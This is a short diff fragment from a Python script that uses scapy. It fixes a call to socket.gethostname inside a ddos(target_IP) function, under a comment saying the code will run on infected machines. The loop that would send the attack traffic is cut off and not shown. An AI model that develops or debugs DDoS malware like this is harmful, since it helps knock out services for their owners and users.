@@ -14,7 +14,7 @@ from scapy.all import *
 
 # CODE THAT RUNS ON INFECTED MACHINE WILL GO HERE
 def ddos(target_IP):
-    source_IP = socket.gethostbyname(socket.gethostname)
+    source_IP = socket.gethostbyname(socket.gethostname())
     source_port = 80
     
     while True:
